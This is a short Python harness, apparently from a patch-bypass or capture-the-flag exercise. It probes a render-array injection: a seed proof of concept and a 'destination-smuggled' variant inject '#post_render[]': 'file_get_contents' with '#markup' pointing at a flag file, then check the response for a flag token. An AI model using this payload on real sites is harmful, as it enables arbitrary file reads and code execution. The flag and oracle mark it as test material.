import json
from oracle import run_probe, original_poc

FLAG_TOKEN = "PCBFLAG_a6d35e59ac23"

print("=== seed @ v1 (top-level '#post_render') ===")
seed = original_poc(version="v1")
print(json.dumps(seed, indent=2))
print("seed flag present:", FLAG_TOKEN in str(seed.get("body", {})))

print("\n=== residual candidate @ v1 (destination-smuggled) ===")
res = {
    "mode": "destination_smuggled_render_key",
    "destination_path": "node",
    "destination_query": {
        "#post_render[]": "file_get_contents",
        "#markup": "/flag/pcb_flag.txt",
    },
}
r = run_probe(res, version="v1")
print(json.dumps(r, indent=2))
print("residual flag present:", FLAG_TOKEN in str(r.get("body", {})))
